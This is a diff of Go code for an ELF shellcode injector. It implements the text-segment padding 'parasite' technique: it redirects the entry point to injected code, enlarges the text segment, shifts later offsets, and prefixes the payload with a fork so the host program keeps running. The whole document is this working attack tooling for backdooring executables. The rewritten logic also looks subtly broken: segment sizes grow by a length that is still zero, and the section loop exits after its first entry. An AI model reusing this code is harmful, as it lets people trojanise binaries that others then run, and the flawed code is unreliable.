@@ -1,13 +1,14 @@
 package bj
 
 import (
-	"errors"
+	//"errors"
 	"io/ioutil"
 	"log"
 	"sort"
 
 	"github.com/Binject/debug/elf"
 	"github.com/Binject/shellcode/api"
+	//"github.com/Binject/shellcode/api"
 )
 
 // ElfBinject - Inject shellcode into an ELF binary
@@ -46,98 +47,59 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	// END CODE CAVE DETECTION SECTION
 	//
 
-	/*
-			  Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
-		        6. Increase p_shoff by PAGE_SIZE in the ELF header
-		        7. Patch the insertion code (parasite) to jump to the entry point (original)
-		        1. Locate the text segment program header
-		            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
-		            -Increase p_filesz to account for the new code (parasite)
-		            -Increase p_memsz to account for the new code (parasite)
-		        2. For each phdr which is after the insertion (text segment)
-		            -increase p_offset by PAGE_SIZE
-		        3. For the last shdr in the text segment
-		            -increase sh_len by the parasite length
-		        4. For each shdr which is after the insertion
-		            -Increase sh_offset by PAGE_SIZE
-		        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
-					into the file - text segment p_offset + p_filesz (original)
-	*/
 
 	PAGE_SIZE := uint64(4096)
-	scAddr := uint64(0)
+	//scAddr := uint64(0)
 	sclen := uint64(0)
 	shellcode := []byte{}
+	text_found := bool(false)
 
-	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
-	elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)
+	//
 
-	afterTextSegment := false
+	//text := uint64(0)        //unsigned long text;
+	parasite_vaddr := uint64(0) //unsigned long parasite_vaddr;
+	old_e_entry := uint64(0)    //unsigned long old_e_entry;
+	end_of_text := uint64(0)    //unsigned int end_of_text;
+
+	//for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
 	for _, p := range elfFile.Progs {
 
-		if afterTextSegment {
-			//2. For each phdr which is after the insertion (text segment)
-			//-increase p_offset by PAGE_SIZE
-			p.Off += PAGE_SIZE
-		} else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
-			// 1. Locate the text segment program header
-			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
-			originalEntry := elfFile.FileHeader.Entry
+		if text_found {
+			p.Off += uint64(PAGE_SIZE)
+		} else if p.Type == elf.PT_LOAD {
 
-			switch elfFile.FileHeader.Type {
-			case elf.ET_EXEC:
-				elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
-			case elf.ET_DYN:
-				// The injected code needs to be executed before any init code in the
-				// binary. There are three possible cases:
-				// - The binary has no init code at all. In this case, we will add a
-				//   DT_INIT entry pointing to the injected code.
-				// - The binary has a DT_INIT entry. In this case, we will interpose:
-				//   we change DT_INIT to point to the injected code, and have the
-				//   injected code call the original DT_INIT entry point.
-				// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
-				//   case, we interpose as well, by replacing the first entry in the
-				//   array to point to the injected code, and have the injected code
-				//   call the original first entry.
-				// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
-				// functions, but this falls into the second case above, since .ctors
-				// are actually run by DT_INIT code.
-				// from positron/elfhack
+			if p.Flags == (elf.PF_R | elf.PF_X) {
 
-			default:
-				return errors.New("Unknown Executable Type: " + string(elfFile.FileHeader.Type))
+				//text = p.Vaddr                      //  p_hdr->p_vaddr;
+				parasite_vaddr = p.Vaddr + p.Filesz    //  p_hdr->p_vaddr + p_hdr->p_filesz;
+				old_e_entry = elfFile.FileHeader.Entry // e_hdr->e_entry;
+				elfFile.Entry = parasite_vaddr         // e_hdr->e_entry = parasite_vaddr;
+				end_of_text = p.Off + p.Filesz         // p_hdr->p_offset + p_hdr->p_filesz;
+				p.Filesz += sclen                      // p_hdr->p_filesz += parasite_size;
+				p.Memsz += sclen                       // p_hdr->p_memsz += parasite_size;
+				text_found = true
+
 			}
-
-			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
-			shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(originalEntry), elfFile.ByteOrder)
-			sclen = uint64(len(shellcode))
-
-			log.Println("Shellcode Length: ", sclen)
-
-			// -Increase p_filesz to account for the new code (parasite)
-			p.Filesz += sclen
-			// -Increase p_memsz to account for the new code (parasite)
-			p.Memsz += sclen
-
-			scAddr = p.Off + p.Filesz
-			afterTextSegment = true
 		}
 	}
 
-	//	3. For the last shdr in the text segment
+	shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(old_e_entry), elfFile.ByteOrder)
+	//shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint64(old_e_entry), elfFile.ByteOrder)
+
+	// sheaders
+
 	sortedSections := elfFile.Sections[:]
 	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
 	for _, s := range sortedSections {
-
-		if s.Addr > scAddr {
-			// 4. For each shdr which is after the insertion
-			//	-Increase sh_offset by PAGE_SIZE
+		if s.Offset >= end_of_text {
 			s.Offset += PAGE_SIZE
-
-		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
-			//	-increase sh_len by the parasite length
+		} else if s.Size+s.Addr == parasite_vaddr {
 			s.Size += sclen
 		}
+
+		elfFile.SHTOffset += int64(PAGE_SIZE)
+
+		break
 	}
 
 	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
